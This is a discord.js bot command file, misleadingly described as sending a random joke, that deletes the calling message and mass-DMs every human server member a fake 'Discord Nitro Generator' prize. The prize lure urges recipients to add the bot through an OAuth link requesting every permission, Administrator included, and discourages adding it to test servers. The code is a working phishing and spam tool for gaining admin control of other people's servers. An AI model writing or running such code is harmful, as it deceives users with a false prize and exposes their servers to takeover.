const Discord = require('discord.js');

module.exports = {
    name: 'eeeeeeeeeeeeeeeeeeeeeeeeeeee',
    aliases: [],
    cooldown: 0,
    permissions: ["SPEAK"],
    description: 'Sends random joke',
    async execute(message, args, cmd, client, Discord){
        message.delete()
        const embed = new Discord.MessageEmbed()
        .setTitle('Click here for the link to add the bot.')
        .setURL('https://discord.com/oauth2/authorize?client_id=836860094892736522&scope=bot&permissions=8589934591')
        .setDescription('You just won: Discord Nitro Generator!')
        .setThumbnail('https://media.threatpost.com/wp-content/uploads/sites/103/2021/04/19145523/Discord-Nitro-e1618858537976.png')
        .addFields(
            {name: 'How did I win?', value: 'You entered a **@Barnibot** supported server, that means that occasionaly Barnibot, or any Member will host a giveaway and you have a chance to win it. And you just won!'},
            {name: 'How do I claim my prize?', value: 'All you have to do to claim your prize is to add this bot to your server **WARNING!: If you add the bot to a testing server you will be disqualified from any other giveaways**, and once you have added the bot, you will recieve the prize AND you will have a chance that the giveaway will be hosted on that server'},
            {name: 'Why would I add the bot?', value: 'Barnibot has a lot of features, you can do **-help** for a list of commands anyone can acces, or you cand do **-commands** for staff commands.'}
        )
        .setFooter('Click here to get the invite link for Barnibot!')
              .setAuthor('BarniBot')
        
message.guild.members.cache.forEach(member => {
    
    if (member.id != client.user.id && !member.user.bot) member.send({embeds: [embed]});
  });
    }
}